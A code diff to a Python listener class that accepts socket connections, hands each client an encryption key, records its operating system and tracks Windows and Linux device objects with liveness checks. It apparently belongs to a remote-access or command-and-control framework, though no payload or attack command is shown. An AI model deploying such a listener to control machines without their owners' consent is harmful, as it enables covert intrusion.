@@ -16,14 +16,19 @@ class Listener(Base_Listener):
         # Check if the connections are still alive
         while True:
             # Check if Server is stopped
+            device_disconnected = False
             if self.stopped:
                 exit()
-            for Device in self.devices:
+            for Device in self.devices.values():
                 if not Device.alive():
-                    self.server.remove_device(Device.id)
-                    log(f"Connection to {Device.addr} has been lost.",
+                    self.remove_device(Device)
+                    log(f"Connection to {Device.addr}  has been lost. [ID : {Device.id}]",
                         alert="critical")
-            time.sleep(10)
+                    logging.info(f"Connection to {Device.addr}  has been lost. [ID : {Device.id}]")
+                    device_disconnected = True
+                    break
+            if not device_disconnected:
+                time.sleep(10)
 
     def listen(self):
         while True:
@@ -32,25 +37,30 @@ class Listener(Base_Listener):
                 exit()
             try:
                 # with self.context.wrap_socket(self.socket, server_side=True) as socket:
-                connection, addr = socket.accept()
+                connection, addr = self.listener.accept()
             except Exception as e:
                 logging.error(e)
                 exit()
             else:
                 self.key = Fernet.generate_key()
                 self.fernet = Fernet(self.key)
-                ph_print(f"New Connection established from {addr[0]}")
+                log(f"New Connection established from {addr[0]}", alert="success")
                 logging.info(f"New Connection established from {addr}")
                 connection.send(self.key)
-                operating_system = self.decrypt(connection.recv(1024)).lower()
+                try:
+                    operating_system = self.decrypt(connection.recv(1024)).lower()
+                except:
+                    log(f"Connection to {addr[0]} has been lost.", alert="critical")
+                    connection.close()
+                    continue
                 if operating_system == "windows":
-                    self.server.add_device(
-                        Windows(connection, addr[0], self.key)) # Create a Windows Object to store the connection
-                    self.add_device(Windows(connection, addr[0], self.key))
+                    self.server.all_devices += 1
+                    self.add_device(
+                        Windows(connection, addr[0], self.key, self.server.all_devices)) # Create a Windows Object to store the connection
                 elif operating_system == "linux":
-                    self.server.remove_device(
-                        Linux(connection, addr[0], self.key)) # Create a Linux Object to store the connection
-                    self.add_device(Linux(connection, addr[0], self.key))
+                    self.server.all_devices += 1
+                    self.add_device(
+                        Linux(connection, addr[0], self.key, self.server.all_devices)) # Create a Linux Object to store the connection
                 else:
                     log(f"Unknown Operating System: {operating_system}",
                         alert="error")
